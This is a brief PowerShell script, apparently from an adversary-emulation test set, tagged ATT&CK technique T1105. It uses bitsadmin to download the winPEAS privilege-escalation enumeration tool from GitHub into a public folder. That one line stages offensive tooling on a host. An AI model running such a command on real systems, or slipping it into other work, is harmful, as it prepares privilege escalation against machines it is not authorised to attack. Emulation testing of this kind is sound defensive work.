# Donwload Winpeas using Bitsadmin
# Technic ID : T1105
Clear-Host
Write-Output "==============================================================================="
Write-Output "Donwload WINPEAS using Bitsadmin (T1105)"
Write-Output "==============================================================================="
#
bitsadmin /transfer DownloadsWinPEAS /download /priority normal https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe $env:PUBLIC\Toolz\winPEASany_ofs.exe